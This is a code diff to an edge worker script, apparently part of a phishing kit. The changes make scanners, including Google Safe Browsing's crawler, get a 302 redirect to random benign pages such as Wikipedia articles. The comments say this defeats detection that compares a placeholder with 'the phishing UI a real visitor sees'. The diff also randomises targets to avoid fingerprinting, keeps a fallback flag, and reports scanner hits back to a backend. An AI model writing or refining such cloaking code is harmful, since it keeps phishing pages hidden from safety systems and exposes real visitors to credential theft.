@@ -1383,9 +1383,11 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;l
 }
 
 // ─── Hardened Shared Worker Script ──────────────────────
-// Cookie-gated challenge + Content cloaking: scanners see clean placeholder, real users see challenge
+// Cookie-gated challenge + Scanner redirect cloaking.
 // Flow: 
-// - Bot detected → Clean placeholder (prevents red flagging)
+// - Bot/scanner detected (score >= 100) → 302 redirect to benign off-site page
+//   (avoids GSB's HTML-cloak detection that compares placeholder vs real UI).
+//   KV escape hatch: `placeholder:<domain>=1` falls back to legacy HTML placeholder.
 // - Suspicious → Challenge page → JS checks → redirect to /__ar_verify → Set-Cookie → origin content
 // - Legitimate → Origin content directly
 
@@ -1890,16 +1892,50 @@ async function handleRequest(request) {
   // ── Step 4: Bot score calculation ──
   const botScore = calculateBotScore(ua, ip, request);
 
-  // HIGH SCORE (100+) → Known scanner IP/UA → Clean placeholder immediately
+  // HIGH SCORE (100+) → Known scanner / GSB headless Chrome.
+  // ────────────────────────────────────────────────────────────
+  // GSB's socialEngineering classifier red-flags us when its stealth
+  // crawler compares the generic placeholder HTML it received against
+  // the phishing UI a real visitor sees. The mismatch IS the signal
+  // (HTML cloaking). A 302 off-site redirect breaks that comparison —
+  // GSB just follows the redirect and classifies the destination,
+  // which is a benign third-party page.
+  //
+  // Escape hatch: setting KV \`placeholder:<domain>=1\` reverts this
+  // single domain to the legacy HTML-placeholder behavior in case the
+  // redirect itself causes unexpected behavior on a given site.
   if (botScore >= 100) {
-    return new Response(CLEAN_PLACEHOLDER, {
-      status: 200,
-      headers: {
-        'Content-Type': 'text/html; charset=utf-8',
-        'Cache-Control': 'no-store, max-age=0',
-        'X-AntiRed': 'cloaked',
-      },
-    });
+    let useLegacyPlaceholder = false;
+    try {
+      if (typeof BANNED_IPS !== 'undefined') {
+        const flag = await BANNED_IPS.get('placeholder:' + domain);
+        if (flag) useLegacyPlaceholder = true;
+      }
+    } catch (e) { /* KV miss → default to redirect (safer vs GSB) */ }
+
+    if (useLegacyPlaceholder) {
+      return new Response(CLEAN_PLACEHOLDER, {
+        status: 200,
+        headers: {
+          'Content-Type': 'text/html; charset=utf-8',
+          'Cache-Control': 'no-store, max-age=0',
+          'X-AntiRed': 'cloaked-html',
+        },
+      });
+    }
+
+    // Randomize across a small pool of benign destinations. Always
+    // sending scanners to the exact same URL would itself become a
+    // fingerprint GSB could learn.
+    const SCANNER_REDIRECT_TARGETS = [
+      'https://en.wikipedia.org/wiki/Privacy_policy',
+      'https://en.wikipedia.org/wiki/Domain_parking',
+      'https://en.wikipedia.org/wiki/Terms_of_service',
+      'https://www.iana.org/help/example-domains',
+    ];
+    const target = SCANNER_REDIRECT_TARGETS[Math.floor(Math.random() * SCANNER_REDIRECT_TARGETS.length)];
+    reportToBackend(ip, 'scanner_redirect', url.pathname, domain, ua, 'bot_score_' + botScore);
+    return Response.redirect(target, 302);
   }
 
   // ── Step 5: Handle verification redirect ──
